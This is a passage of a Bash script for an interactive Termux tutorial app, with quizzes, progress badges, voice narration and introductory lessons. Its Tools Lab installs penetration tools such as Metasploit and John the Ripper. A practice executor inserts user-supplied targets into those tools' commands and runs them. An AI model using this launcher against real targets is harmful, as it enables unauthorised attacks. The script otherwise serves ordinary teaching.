    echo -e "${BLUE}$(printf '━%.0s' $(seq 1 $width))${NC}"
}

# Section header
header() {
    clear
    local width=$(get_width)
    local border_color="${CYAN}"
    local title_style="${WHITE}"

    # Check if this is an urgent mission
    if [[ "$2" == "urgent" ]]; then
        border_color="${RED}"
        title_style="${RED}"
    fi

    echo -e "${border_color}╭$(printf '─%.0s' $(seq 1 $((width-2))))╮${NC}"
    center "${WHITE}⚡ ${border_color}TERMUX${NC} ${MAGENTA}MASTERCLASS${NC} ${WHITE}⚡${NC}"
    center "${WHITE}by Emmanuel Suah${NC}"
    center "$(get_progress_string)"
    echo -e "${border_color}├$(printf '─%.0s' $(seq 1 $((width-2))))┤${NC}"
    center "${border_color}»${NC} ${title_style}📍 CURRENT PATH: $1${NC} ${border_color}«${NC}"
    echo -e "${border_color}╰$(printf '─%.0s' $(seq 1 $((width-2))))╯${NC}"
    echo ""
}

# New: Achievement system
check_achievements() {
    local count=${#DONE_LESSONS[@]}
    (( count >= 5 )) && ACHIEVEMENTS["FOUNDATION"]="[Beginner Badge]"
    (( CHALLENGES_COMPLETED >= 10 )) && ACHIEVEMENTS["ELITE"]="[Challenge Elite]"
    (( count >= 17 )) && ACHIEVEMENTS["MASTER"]="[Masterclass Graduate]"
}

# Pause for user
pause() {
    local lesson_idx=$1
    if [[ -n "$lesson_idx" ]]; then
        offer_tool_exercises "$lesson_idx"
        echo ""
        DONE_LESSONS["$lesson_idx"]=$(date '+%Y-%m-%d %H:%M')

        # Trigger Matrix rain celebration when all 34 lessons are complete
        if [[ ${#DONE_LESSONS[@]} -eq 34 ]]; then
            matrix_rain 7
            echo -e "${GREEN}"
            center "CONGRATULATIONS, MASTER GRADUATE!"
            center "All 34 curriculum modules have been mastered."
            echo -e "${NC}"
            sleep 3
        fi

        check_achievements
        termux-vibrate -d 100 2>/dev/null
        save_progress
    fi
    echo ""
    echo -e "${YELLOW}  ➤ Press [ENTER] to continue...${NC}"
    read
}

# Display a command example
show_cmd() {
    echo -e "  ${GREEN}\$${NC} ${WHITE}$1${NC}"
    # We skip auto-narration for commands as syntax reading is often confusing
}

# Display explanation
explain() {
    echo -e "  ${CYAN}ℹ️  $1${NC}"
    [[ "$TTS_FULL_NARRATION" == "1" ]] && termux-tts-speak "$1" 2>/dev/null &
}

# Display warning
warn() {
    echo -e "  ${RED}⚠️  $1${NC}"
    [[ "$TTS_FULL_NARRATION" == "1" ]] && termux-tts-speak "Warning: $1" 2>/dev/null &
}

# Display success/failure
success() {
    echo -e "  ${GREEN}✅ $1${NC}"
    # Quiz results handle their own narration, but we support it here for general success
    [[ "$TTS_FULL_NARRATION" == "1" ]] && [[ ! "$1" == "Correct!" ]] && termux-tts-speak "$1" 2>/dev/null &
}

failure() {
    echo -e "  ${RED}❌ $1${NC}"
    [[ "$TTS_FULL_NARRATION" == "1" ]] && [[ ! "$1" == "Incorrect"* ]] && termux-tts-speak "$1" 2>/dev/null &
}

# Display tip
tip() {
    echo -e "  ${YELLOW}💡 TIP & TRACK: $1${NC}"
    [[ "$TTS_FULL_NARRATION" == "1" ]] && termux-tts-speak "Tip: $1" 2>/dev/null &
}

# Display tool name
tool_name() {
    echo -e "  ${MAGENTA}🔧 $1${NC}"
    [[ "$TTS_FULL_NARRATION" == "1" ]] && termux-tts-speak "Tool: $1" 2>/dev/null &
}

# Live Lab Emulator
live_lab() {
    local objective=$1
    echo ""
    echo -e "  ${MAGENTA}🧪 LIVE LAB ENVIRONMENT${NC}"
    [[ -n "$objective" ]] && echo -e "  ${WHITE}GOAL: $objective${NC}"
    echo -e "  ${WHITE}Commands are real-time. Type 'exit' to return to class.${NC}"
    line
    bash --noprofile --norc -i
    line
}

# Quiz Engine
quiz() {
    local question=$1
    local optA=$2
    local optB=$3
    local optC=$4
    local correct=$5
    
    echo -e "  ${YELLOW}❓ QUIZ:${NC} ${WHITE}$question${NC}"
    echo -e "     A) $optA"
    echo -e "     B) $optB"
    echo -e "     C) $optC"
    echo ""
    echo -ne "  ${CYAN}Your answer (A/B/C): ${NC}"
    read -n 1 answer
    echo ""
    
    if [[ "${answer^^}" == "$correct" ]]; then
        termux-tts-speak -p 1.2 -r 1.2 "Correct" 2>/dev/null &
        success "Correct!"
        return 0
    else
        termux-tts-speak -p 0.5 -r 1.0 "Incorrect" 2>/dev/null &
        failure "Incorrect. The correct answer was $correct."
        return 1
    fi
}

# Helper to get completion status icon
get_status() {
    if [[ -n "${DONE_LESSONS[$1]}" ]]; then
        echo -e "${GREEN}✅${NC}"
    else
        echo -e "${RED}⭕${NC}"
    fi
}

# Calculate progress string for centering
get_progress_string() {
    local total=34
    local width=25
    local count=0
    for i in {1..34}; do
        [[ -n "${DONE_LESSONS[$i]}" ]] && ((count++))
    done
    local filled=$(( count * width / total ))
    local percent=$(( count * 100 / total ))
    
    # Determine Student Rank
    local rank="${YELLOW}RECRUIT${NC}"
    if (( percent >= 100 )); then rank="${MAGENTA}MASTER${NC}"
    elif (( percent >= 75 )); then rank="${RED}ELITE${NC}"
    elif (( percent >= 50 )); then rank="${CYAN}ADEPT${NC}"
    elif (( percent >= 25 )); then rank="${GREEN}STUDENT${NC}"
    fi

    echo -e "${WHITE}Rank: $rank | Progress: ${CYAN}[${GREEN}$(printf '█%.0s' $(seq 1 $filled))${WHITE}$(printf '░%.0s' $(seq 1 $((width-filled))))${CYAN}] ${percent}%${NC}"
}

show_progress() {
    center "$(get_progress_string)"
}

#=============================================================================
# TOOLS LAB: CHECK & INSTALL ESSENTIAL TOOLS
#=============================================================================
tools_lab() {
    header "Tools Lab: Check & Install Essential Tools"

    echo -e "  ${WHITE}This section will check for the installation of key tools${NC}"
    echo -e "  ${WHITE}and offer to install any that are missing.${NC}"
    echo ""

    declare -a missing_tools_names
    declare -a missing_tools_install_cmds

    for tool_name in "${!TOOLS_TO_CHECK[@]}"; do
        local commands_str="${TOOLS_TO_CHECK[$tool_name]}"
        local check_cmd=$(echo "$commands_str" | cut -d';' -f1)
        local install_cmd=$(echo "$commands_str" | cut -d';' -f2)
        local desc=$(echo "$commands_str" | cut -d';' -f3)

        echo -e "  ${CYAN}● ${tool_name}${NC}: ${WHITE}${desc}${NC}"
        echo -ne "    Status: "
        # Suppress output of check_cmd for cleaner display
        if eval "$check_cmd" > /dev/null 2>&1; then
            success "Installed"
        else
            failure "Missing"
            missing_tools_names+=("$tool_name")
            missing_tools_install_cmds+=("$install_cmd")
        fi
    done

    if [ ${#missing_tools_names[@]} -eq 0 ]; then
        echo ""
        success "All specified tools are installed!"
    else
        echo ""
        warn "The following tools are missing:"
        for name in "${missing_tools_names[@]}"; do
            echo -e "  - ${YELLOW}$name${NC}"
        done
        echo ""
        echo -ne "  ${NC}\033[25m${YELLOW}Do you want to install the missing tools now? (y/n): ${NC}"
        read -n 1 install_confirm
        echo ""

        if [[ "$install_confirm" =~ ^[Yy]$ ]]; then
            echo ""
            echo -e "  ${CYAN}Starting installation of missing tools...${NC}"
            # Ensure pkg is updated before installing
            echo -e "  ${CYAN}Updating package lists...${NC}"
            pkg update -y

            for i in "${!missing_tools_names[@]}"; do
                local name="${missing_tools_names[$i]}"
                local cmd="${missing_tools_install_cmds[$i]}"
                echo -e "  ${WHITE}Installing ${CYAN}$name${NC}..."
                
                # Special handling for Metasploit's unstable repo
                if [[ "$name" == "Metasploit" ]]; then
                    echo -e "  ${CYAN}Adding unstable-repo for Metasploit...${NC}"
                    pkg install unstable-repo -y
                fi
                
                eval "$cmd"
                if [ $? -eq 0 ]; then
                    success "$name installed successfully."
                else
                    failure "Failed to install $name."
                fi
            done
            success "Installation attempt complete."
        else
            echo -e "  ${YELLOW}Skipping installation.${NC}"
        fi
    fi

   echo ""
    line
    echo -e "  ${MAGENTA}🧪 DEEP PRACTICE SESSION${NC}"
    echo -e "  ${WHITE}Select a tool index to view 20+ expert details and start a lab.${NC}"
    echo -ne "  ${YELLOW}Enter Tool Name (or 'n' to skip): ${NC}"
    read p_tool

    if [[ -n "${TOOL_PRACTICE_GUIDES[$p_tool]}" ]]; then
        tool_practice_session "$p_tool"
    fi

    echo ""
    line
    echo -e "  ${MAGENTA}🎓 TOOLS KNOWLEDGE CHECK${NC}"
    echo -ne "  ${NC}\033[25m${YELLOW}Would you like to start the Knowledge Quiz for all tools? (y/n): ${NC}"
    read -n 1 quiz_confirm
    echo ""

    if [[ "$quiz_confirm" =~ ^[Yy]$ ]]; then
        local score=0
        local total=${#TOOL_QUIZZES[@]}
        local failed_tools=()

        # Iterate through quizzes (alphabetical order)
        while IFS= read -r t; do
            header "Tool Quiz: $t"
            IFS='|' read -r q a b c cor <<< "${TOOL_QUIZZES[$t]}"
            if quiz "$q" "$a" "$b" "$c" "$cor"; then
                ((score++))
            else
                failed_tools+=("$t")
                FAILED_TOOLS["$t"]=$(( ${FAILED_TOOLS["$t"]:-0} + 1 ))
                local l_num="${TOOL_TO_LESSON[$t]}"
                if [[ -n "$l_num" ]]; then
                    echo ""
                    echo -ne "  ${NC}\033[25m${YELLOW}Would you like to jump to Lesson $l_num (${LESSON_TITLES[$l_num]}) to review? (y/n): ${NC}"
                    read -n 1 jump_confirm
                    if [[ "$jump_confirm" =~ ^[Yy]$ ]]; then
                        echo ""
                        lesson_$l_num
                        return # Exit the lab to follow the jump
                    fi
                fi
            fi
            echo -e "\n  Current Score: ${GREEN}$score${NC} / $total"
            pause
        done < <(for k in "${!TOOL_QUIZZES[@]}"; do echo "$k"; done | sort)

        save_progress
        success "Quiz Session Complete! Final Score: $score / $total"

        if [ ${#failed_tools[@]} -gt 0 ]; then
            echo ""
            warn "RECOMMENDED STUDY:"
            echo -e "  Based on your performance, you might want to review these tools:"
            for ft in "${failed_tools[@]}"; do
                local desc=$(echo "${TOOLS_TO_CHECK[$ft]}" | cut -d';' -f3)
                echo -e "  - ${MAGENTA}$ft${NC}: $desc"
            done
        fi
    fi
    pause
}

# New: Display tool information in a stylized card format
display_tool_card() {
    local tool_name="$1"
    local width=$(get_width)
    local card_width=70 # Fixed width for the card content
    local margin=$(( (width - card_width) / 2 ))
    (( margin < 0 )) && margin=0
    local pad=$(printf "%${margin}s" "")

    local tool_info="${TOOLS_TO_CHECK[$tool_name]}"
    local tool_desc=$(echo "$tool_info" | cut -d';' -f3)
    
    local practice_details_str="${TOOL_PRACTICE_GUIDES[$tool_name]}"
    IFS='|' read -ra practice_details <<< "$practice_details_str"

    local quiz_info="${TOOL_QUIZZES[$tool_name]}"
    local quiz_question=""
    if [[ -n "$quiz_info" ]]; then
        IFS='|' read -r quiz_question_full _ <<< "$quiz_info"
        quiz_question=$(echo "$quiz_question_full" | sed 's/^\s*//') # Trim leading whitespace
    fi

    echo -e "${pad}${CYAN}╔$(printf '═%.0s' $(seq 1 $((card_width-2))))╗${NC}"
    center "${MAGENTA}🔧 ${tool_name} ${MAGENTA}🔧${NC}"
    echo -e "${pad}${CYAN}╠$(printf '═%.0s' $(seq 1 $((card_width-2))))╣${NC}"
    
    center "${WHITE}Description:${NC}"
    center "${YELLOW}${tool_desc}${NC}"
    
    echo -e "${pad}${CYAN}╠$(printf '═%.0s' $(seq 1 $((card_width-2))))╣${NC}"
    center "${WHITE}Key Commands (First 7):${NC}"
    local count=0
    for detail in "${practice_details[@]}"; do
        if (( count >= 7 )); then break; fi
        local cmd_part=$(echo "$detail" | cut -d':' -f1 | sed 's/^[0-9]*\. //')
        center "${GREEN}  ${cmd_part}${NC}"
        ((count++))
    done

    if [[ -n "$quiz_question" ]]; then
        echo -e "${pad}${CYAN}╠$(printf '═%.0s' $(seq 1 $((card_width-2))))╣${NC}"
        center "${WHITE}Knowledge Check:${NC}"
        center "${YELLOW}${quiz_question}${NC}"
    fi

    echo -e "${pad}${CYAN}╚$(printf '═%.0s' $(seq 1 $((card_width-2))))╝${NC}"
    echo ""
}

show_flag_explanations() {
    local t=$1
    if [[ -z "${FLAG_EXPLANATIONS[$t]}" ]]; then
        warn "No detailed explanations available for $t yet."
        pause # Keep pause for this case
    else
        header "EXPLANATIONS: $t"
        local explanations_text="  ${WHITE}Detailed Flag Breakdowns:${NC}\n"
        explanations_text+="$(echo -e "${FLAG_EXPLANATIONS[$t]}" | sed 's/^/  • /')"

        if command -v less >/dev/null 2>&1; then
            echo -e "$explanations_text" | less -R
        else
            warn "Paging tool 'less' not found. Displaying full content without scrolling. Consider 'pkg install less'."
            echo -e "$explanations_text"
            pause # Keep pause for fallback
        fi
    fi
}

tool_practice_session() {
    local t=$1
    local t1=""
    local t2=""
    local dry_run=false

    # Add specific commands for Radare2 patching
    if [[ "$t" == "Radare2" ]]; then
        TOOL_PRACTICE_GUIDES["Radare2"]="${TOOL_PRACTICE_GUIDES["Radare2"]}|11. w <string>: Write string at current address|12. w0 <len>: Write N null bytes"
    fi
    
    # Mapping tool names to their actual binary/entry command for execution
    local binary="$t"
    case "$t" in
        "John the Ripper") binary="john" ;;
        "Termux API") binary="" ;; # Commands are already absolute in API guide
        "Aria2") binary="aria2c" ;;
        "Metasploit") binary="msfconsole" ;;
    esac

    IFS='|' read -ra details <<< "${TOOL_PRACTICE_GUIDES[$t]}"

    while true; do
        header "PRACTICE: $t (Expert Reference)" # Keep header for consistency
        display_tool_card "$t" # Display the stylized card
        
        echo ""
        line
        echo -e "  ${MAGENTA}⚡ TRY IT YOURSELF (Real-Time Executor)${NC}"
        echo -e "  ${WHITE}T1: ${YELLOW}${t1:-None}${NC} | T2: ${YELLOW}${t2:-None}${NC} | Dry Run: $([[ "$dry_run" == true ]] && echo -e "${GREEN}ON${NC}" || echo -e "${RED}OFF${NC}")"
        echo -ne "  ${NC}\033[25m${YELLOW}Select (1-22), 'e' explain, 't1'/'t2' set, 'd' toggle dry, or 'q' lab: ${NC}"
        read p_choice

        if [[ "$p_choice" =~ ^[0-9]+$ ]] && (( p_choice >= 1 && p_choice <= 22 )); then
            local selected="${details[$((p_choice-1))]}"
            local cmd_part=$(echo "$selected" | cut -d':' -f1 | sed 's/^[0-9]*\. //')
            
            local full_cmd="$binary $cmd_part"
            # Multi-placeholder support
            if [[ "$cmd_part" == *"{target"* ]]; then
                full_cmd="${full_cmd//\{target1\}/$t1}"
                full_cmd="${full_cmd//\{target2\}/$t2}"
                full_cmd="${full_cmd//\{target\}/$t1}"
            else
                # Legacy: append T1 if no specific placeholder is used
                full_cmd="$full_cmd $t1"
            fi

            if [[ "$dry_run" == true ]]; then
                warn "DRY RUN ACTIVE: Command will not be executed."
                echo -e "  ${WHITE}Final Command: ${GREEN}$full_cmd${NC}"
                echo ""
                echo -ne "  ${NC}\033[25m${YELLOW}Copy this command to clipboard? (y/n): ${NC}"
                read -n 1 copy_confirm
                if [[ "$copy_confirm" =~ ^[Yy]$ ]]; then
                    echo -n "$full_cmd" | termux-clipboard-set
                    success "Command copied to clipboard!"
                fi
            else
                local cmd_desc=$(echo "$selected" | cut -d':' -f2)
                echo -e "\n  ${CYAN}Task: ${WHITE}$cmd_desc${NC}"
                echo -e "  ${WHITE}Executing: ${GREEN}$full_cmd${NC}"
                line
                bash -c "$full_cmd"
            fi
            line
            pause
        elif [[ "$p_choice" == "e" ]]; then
            show_flag_explanations "$t"
            continue
        elif [[ "$p_choice" == "t" || "$p_choice" == "t1" ]]; then
            echo ""
            echo -ne "  ${NC}\033[25m${YELLOW}Enter Target 1: ${NC}"
            read t1
            success "Target 1 updated."
            sleep 1
        elif [[ "$p_choice" == "t2" ]]; then
            echo ""
            echo -ne "  ${NC}\033[25m${YELLOW}Enter Target 2: ${NC}"
            read t2
            success "Target 2 updated."
            sleep 1
        elif [[ "$p_choice" == "d" ]]; then
            if [[ "$dry_run" == true ]]; then dry_run=false; else dry_run=true; fi
            success "Dry Run toggled."
            sleep 0.5
        elif [[ "$p_choice" == "q" ]]; then
            break
        fi
    done
    
    echo ""
    line
    echo -e "  ${WHITE}Launching Live Lab for ${MAGENTA}$t${NC}..."
    tip "Use the commands listed above to explore the tool's capabilities."
    live_lab "Practice using $t with different flags."
    pause
}

#=============================================================================
# REVIEW MODE: QUIZ ON FAILED TOOLS
#=============================================================================
review_mode() {
    header "REVIEW MODE: Master Your Weak Spots"
    
    # Identify tools that currently need review (count > 0)
    local review_list=()
    for t in "${!FAILED_TOOLS[@]}"; do
        if (( FAILED_TOOLS["$t"] > 0 )); then
            review_list+=("$t")
        fi
    done

    if [[ ${#review_list[@]} -eq 0 ]]; then
        success "Excellent! You have no failed tools to review."
        pause
        return
    fi

    echo -e "  ${WHITE}You currently have ${YELLOW}${#review_list[@]}${WHITE} tools to master.${NC}"
    echo ""

    local score=0
    local total=${#review_list[@]}
    
    # Prioritize: Sort tools by failure count (descending)
    local sorted_tools=()
    while IFS= read -r line; do
        [[ -n "$line" ]] && sorted_tools+=("${line#*:}")
    done < <(for t in "${review_list[@]}"; do echo "${FAILED_TOOLS[$t]}:$t"; done | sort -rn)

    for t in "${sorted_tools[@]}"; do
        header "Review Quiz: $t (Failures: ${FAILED_TOOLS[$t]})"
        IFS='|' read -r q a b c cor <<< "${TOOL_QUIZZES[$t]}"
        if quiz "$q" "$a" "$b" "$c" "$cor"; then
            ((score++))
            FAILED_TOOLS["$t"]=0 # Tool mastered
        else
            FAILED_TOOLS["$t"]=$(( FAILED_TOOLS["$t"] + 1 ))
            local l_num="${TOOL_TO_LESSON[$t]}"
            if [[ -n "$l_num" ]]; then
                echo -e "\n  ${NC}\033[25m${YELLOW}Would you like to jump to Lesson $l_num (${LESSON_TITLES[$l_num]}) to review? (y/n): ${NC}"
                read -n 1 jump_confirm
                if [[ "$jump_confirm" =~ ^[Yy]$ ]]; then
                    echo ""
                    lesson_$l_num
                    return
                fi
            fi
        fi
        save_progress
        pause
    done
    success "Review Session Complete! Resolved $score / $total tools."
    pause
}

#=============================================================================
# CHALLENGE MODE: RANDOM TASK GENERATOR
#=============================================================================
challenge_mode() {
    local missions_this_run=0
    while true; do
        header "CHALLENGE MODE: Gauntlet (Missions this session: $missions_this_run)" "urgent"
        
        echo -e "  ${WHITE}Tasks are generated from the 20 expert details of each tool.${NC}"
        echo -e "  ${WHITE}You will be given an objective and dropped into the lab.${NC}"
        echo ""

        # Select a random tool that has a practice guide
        local tools=("${!TOOL_PRACTICE_GUIDES[@]}")
        local t=${tools[$RANDOM % ${#tools[@]}]}
        
        # Select a random detail (1-20)
        IFS='|' read -ra details <<< "${TOOL_PRACTICE_GUIDES[$t]}"
        local rand_idx=$(( RANDOM % 20 ))
        local detail="${details[$rand_idx]}"
        
        # Parse the detail (Format: "Index. Flag/Cmd: Description")
        local task_desc=$(echo "$detail" | cut -d':' -f2- | sed 's/^ //')
        local hint=$(echo "$detail" | cut -d':' -f1 | cut -d' ' -f2-)

        echo -e "  ${MAGENTA}MISSION ASSIGNED:${NC}"
        thick_line
        center "${CYAN}TOOL:${NC} ${WHITE}$t${NC}"
        center "${CYAN}OBJECTIVE:${NC} ${YELLOW}Perform a $task_desc${NC}"
        thick_line
        echo ""
        tip "You might need to use the following flag/command: ${MAGENTA}$hint${NC}"
        echo ""
        echo -ne "  ${NC}\033[25m${WHITE}Start Mission? (y) or Quit Gauntlet (q): ${NC}"
        read -n 1 start_confirm
        echo ""

        if [[ ! "$start_confirm" =~ ^[Yy]$ ]]; then
            break
        fi

        live_lab "MISSION: Use $t to $task_desc (Hint: $hint)"
        
        echo ""
        echo -ne "  ${NC}\033[25m${YELLOW}Did you successfully complete the objective? (y/n): ${NC}"
        read -n 1 success_confirm
        echo ""
        
        if [[ "$success_confirm" =~ ^[Yy]$ ]]; then
            ((CHALLENGES_COMPLETED++))
            ((missions_this_run++))
            termux-tts-speak -p 1.1 "Mission Accomplished" 2>/dev/null &
            success "Mission Accomplished! Challenge Points: $CHALLENGES_COMPLETED"
            check_achievements
            save_progress
        else
            termux-tts-speak -p 0.6 "Mission Failed" 2>/dev/null &
            warn "Mission aborted. Keep practicing!"
        fi

        echo -e "\n  ${CYAN}Press any key for the next mission...${NC}"
        read -n 1
    done
    success "Gauntlet Over! Total missions this session: $missions_this_run"
    pause
}

# New: Voice Narration Settings
voice_settings() {
    while true; do
        header "VOICE SETTINGS"
        echo -e "  Customize the pitch and speed of the system narration."
        echo -e "  Recommended range: 0.5 (Low/Slow) to 2.0 (High/Fast)."
        echo ""
        echo -e "  ${WHITE}Current Pitch:${NC} ${CYAN}$TTS_PITCH${NC}"
        echo -e "  ${WHITE}Current Rate:${NC}  ${CYAN}$TTS_RATE${NC}"
        echo -e "  ${WHITE}Full Narration:${NC} $([[ "$TTS_FULL_NARRATION" == "1" ]] && echo -e "${GREEN}ENABLED${NC}" || echo -e "${RED}DISABLED${NC}")"
        echo ""
        echo -e "  ${GREEN}[P]${NC} Change Pitch"
        echo -e "  ${GREEN}[R]${NC} Change Rate"
        echo -e "  ${GREEN}[F]${NC} Toggle Full Narration"
        echo -e "  ${GREEN}[T]${NC} Test Voice Sample"
        echo -e "  ${RED}[B]${NC} Back to Profile"
        echo ""
        echo -ne "  ${NC}\033[25m${YELLOW}Choice ➤ ${NC}"
        read -n 1 vchoice
        echo ""

        case $vchoice in
            [Pp])
                echo -ne "  ${YELLOW}Enter New Pitch (e.g., 1.0): ${NC}"
                read input_p
                [[ -n "$input_p" ]] && TTS_PITCH="$input_p"
                save_progress
                ;;
            [Rr])
                echo -ne "  ${YELLOW}Enter New Rate (e.g., 1.0): ${NC}"
                read input_r
                [[ -n "$input_r" ]] && TTS_RATE="$input_r"
                save_progress
                ;;
            [Ff])
                if [[ "$TTS_FULL_NARRATION" == "1" ]]; then TTS_FULL_NARRATION=0; else TTS_FULL_NARRATION=1; fi
                save_progress
                ;;
            [Tt])
                success "Playing test sample..."
                termux-tts-speak "This is a test of the Termux Masterclass narration system. How do I sound?" 2>/dev/null &
                ;;
            [Bb]) return ;;
            *) echo -e "  ${RED}Invalid choice.${NC}"; sleep 0.5 ;;
        esac
    done
}

#=============================================================================
# USER PROFILE & HALL OF SHAME
#=============================================================================
show_profile() {
    header "USER PROFILE: $USER_NAME"
    
    echo -e "  ${WHITE}Learning Progress:${NC} ${GREEN}${#DONE_LESSONS[@]} / 20 Lessons${NC}"
    echo -e "  ${WHITE}Challenges Won:${NC} ${YELLOW}$CHALLENGES_COMPLETED Missions${NC}"
    echo -e "  ${WHITE}Achievements:${NC} ${CYAN}${ACHIEVEMENTS[*]:-No badges yet}${NC}"
    echo ""
    line
    
    echo -e "  ${RED}💀 HALL OF SHAME (Top 3 Struggled Tools)${NC}"
    echo -e "  ${WHITE}These tools need your attention the most!${NC}"
    echo ""

    local count=0
    while IFS=':' read -r f_count t_name; do
        if [[ -n "$t_name" ]]; then
            echo -e "  ${RED}#$((++count))${NC} ${MAGENTA}$t_name${NC} — ${YELLOW}$f_count failed attempts${NC}"
        fi
    done < <(for t in "${!FAILED_TOOLS[@]}"; do 
                if (( FAILED_TOOLS["$t"] > 0 )); then
                    echo "${FAILED_TOOLS[$t]}:$t"
                fi
             done | sort -rn | head -n 3)

    [[ $count -eq 0 ]] && echo -e "  ${GREEN}Clear records! You haven't failed any tools recently.${NC}"
    
    echo ""
    line # This line is not a prompt, no change needed.
    
    echo -e "  ${MAGENTA}👤 ABOUT THE CREATOR${NC}"
    echo -e "  ${WHITE}This Termux Masterclass was designed and developed by Emmanuel Suah.${NC}"
    echo -e "  ${WHITE}Dedicated to empowering users with command-line knowledge and skills.${NC}"
    echo ""
    
    line
    echo -ne "  ${NC}\033[25m${YELLOW}Press [N] Name, [V] Voice, or any other key to return: ${NC}"
    read -n 1 p_choice
    if [[ "$p_choice" =~ ^[Nn]$ ]]; then
        echo -ne "\n  ${NC}\033[25m${YELLOW}Enter your new name: ${NC}"
        read USER_NAME
        save_progress
        success "Name updated to $USER_NAME"
        sleep 1
    elif [[ "$p_choice" =~ ^[Vv]$ ]]; then
        echo ""
        voice_settings
    fi
}

#=============================================================================
# LESSON 1: INTRODUCTION TO TERMUX
#=============================================================================
lesson_1() {
    header "LESSON 1: What is Termux?"

    termux-tts-speak "Welcome to Lesson 1. In this introduction, we will explore what Termux is, its capabilities, and key directories in the Android Linux environment." 2>/dev/null &

    echo -e "  ${WHITE}Termux is a powerful terminal emulator for Android.${NC}"
    echo ""
    echo -e "  It provides:"
    echo -e "  ${GREEN}✔${NC} A Linux environment without rooting"
    echo -e "  ${GREEN}✔${NC} A package manager (pkg/apt)"
    echo -e "  ${GREEN}✔${NC} Access to thousands of Linux packages"
    echo -e "  ${GREEN}✔${NC} SSH, Python, Node.js, and more"
    echo -e "  ${GREEN}✔${NC} File system access on your device"
    echo -e "  ${GREEN}✔${NC} Automation capabilities"
    echo ""
    echo -e "  ${WHITE}Key Directories:${NC}"
    echo -e "  ${CYAN}Home:${NC}     \$HOME (~)      = /data/data/com.termux/files/home"
    echo -e "  ${CYAN}Prefix:${NC}   \$PREFIX        = /data/data/com.termux/files/usr"
    echo -e "  ${CYAN}Storage:${NC}  ~/storage       = Shared Android storage (after setup)"
    echo ""
    warn "Always install Termux from F-Droid, NOT Google Play Store."
    warn "The Play Store version is outdated and broken."

    quiz "Where should you install Termux from?" "Google Play Store" "F-Droid" "Unknown Website" "B"
    
    live_lab "Explore your home directory using 'ls -a' and 'pwd'."
    pause 1
}

#=============================================================================
# LESSON 2: INITIAL SETUP
#=============================================================================
lesson_2() {
    header "LESSON 2: Initial Setup & Essential Commands"

    termux-tts-speak "Welcome to Lesson 2. In this module, we will perform the initial setup for your environment, including package updates, storage configuration, and essential command-line navigation." 2>/dev/null &

    echo -e "  ${WHITE}━━━ FIRST THINGS FIRST ━━━${NC}"
    echo ""
    echo -e "  ${WHITE}Step 1: Update & Upgrade packages${NC}"
    show_cmd "pkg update && pkg upgrade -y"
    echo ""
    explain "Best Practice: Run updates weekly to avoid broken dependencies."
    echo ""

    echo -e "  ${WHITE}Step 2: Grant storage access${NC}"
    show_cmd "termux-setup-storage"
    explain "This creates ~/storage with links to Downloads, DCIM, Music, etc."
    tip "Practice: Use 'termux-setup-storage' immediately to bridge Android and Linux files."
    echo ""

    echo -e "  ${WHITE}━━━ NAVIGATION & HYGIENE ━━━${NC}"
    echo ""
    explain "Practice: Use 'ls -lh' to see human-readable file sizes."
    show_cmd "pwd                    # Print current directory"
    show_cmd "ls -la                 # List files with details"
    show_cmd "cd ~/storage/downloads # Navigate to Downloads"
    show_cmd "mkdir my_project       # Create a directory"
    show_cmd "touch file.txt         # Create an empty file"
    show_cmd "cp file.txt backup.txt # Copy a file"
    show_cmd "mv file.txt new.txt    # Move/rename a file"
    show_cmd "rm file.txt            # Delete a file"
    show_cmd "cat file.txt           # Display file contents"
    show_cmd "tree                   # Show directory tree"
    echo ""

    echo -e "  ${WHITE}━━━ PACKAGE MANAGEMENT ━━━${NC}"
    echo ""
    show_cmd "pkg search <name>      # Search for a package"
    show_cmd "pkg install <name>     # Install a package"
    show_cmd "pkg uninstall <name>   # Remove a package"
    show_cmd "pkg list-installed     # List installed packages"
    show_cmd "apt list --upgradable  # Check for updates"
    show_cmd "pkg info <name>        # Detailed package description"
    echo ""

    tip "You can use 'apt' instead of 'pkg' — they work the same."
    tip "Use 'pkg autoclean' to free up space."

    quiz "Which command is used to grant storage access?" "pkg storage" "termux-setup-storage" "ls -storage" "B"

    live_lab "Create a directory 'lab1', enter it, and create an empty file named 'test.txt'."
    pause 2
}

#=============================================================================
# LESSON 3: TEXT EDITORS
#=============================================================================
lesson_3() {
    header "LESSON 3: Text Editors (nano, vim, micro)"

    termux-tts-speak "Lesson 3 covers text editors. We will look at nano for beginners, vim for advanced users, and micro for a modern terminal editing experience." 2>/dev/null &

    echo -e "  ${WHITE}━━━ NANO (Beginner Friendly) ━━━${NC}"
    tool_name "nano"
    show_cmd "pkg install nano"
    show_cmd "nano filename.txt"
    echo ""
    echo -e "  ${WHITE}Key Shortcuts:${NC}"
    echo -e "  ${CYAN}Ctrl+O${NC}  → Save file"
    echo -e "  ${CYAN}Ctrl+X${NC}  → Exit"
    echo -e "  ${CYAN}Ctrl+K${NC}  → Cut line"
    echo -e "  ${CYAN}Ctrl+U${NC}  → Paste line"
    echo -e "  ${CYAN}Ctrl+W${NC}  → Search"
    echo -e "  ${CYAN}Ctrl+G${NC}  → Help"
    echo ""

    echo -e "  ${WHITE}━━━ VIM (Advanced/Powerful) ━━━${NC}"
    tool_name "vim"
    show_cmd "pkg install vim"
    show_cmd "vim filename.txt"
    echo ""
    echo -e "  ${WHITE}Key Modes & Commands:${NC}"
    echo -e "  ${CYAN}i${NC}       → Insert mode (start typing)"
    echo -e "  ${CYAN}Esc${NC}     → Normal mode"
    echo -e "  ${CYAN}:w${NC}      → Save"
    echo -e "  ${CYAN}:q${NC}      → Quit"
    echo -e "  ${CYAN}:wq${NC}     → Save and quit"
    echo -e "  ${CYAN}:q!${NC}     → Quit without saving"
    echo -e "  ${CYAN}dd${NC}      → Delete line"
    echo -e "  ${CYAN}/text${NC}   → Search for 'text'"
    echo ""

    echo -e "  ${WHITE}━━━ MICRO (Modern & Easy) ━━━${NC}"
    tool_name "micro"
    show_cmd "pkg install micro"
    show_cmd "micro filename.txt"
    explain "Micro uses familiar Ctrl+S to save, Ctrl+Q to quit."
    echo ""

    tip "Beginners: start with nano or micro."
    tip "Power users: invest time learning vim — it's worth it."

    pause 3
}

#=============================================================================
# LESSON 4: PYTHON
#=============================================================================
lesson_4() {
    header "LESSON 4: Python in Termux"

    termux-tts-speak "In Lesson 4, you will learn how to install and use Python, run scripts, and manage packages using pip in your Termux environment." 2>/dev/null &

    echo -e "  ${WHITE}━━━ INSTALLATION ━━━${NC}"
    show_cmd "pkg install python"
    show_cmd "python --version"
    show_cmd "pip --version"
    echo ""

    echo -e "  ${WHITE}━━━ RUNNING PYTHON ━━━${NC}"
    echo ""
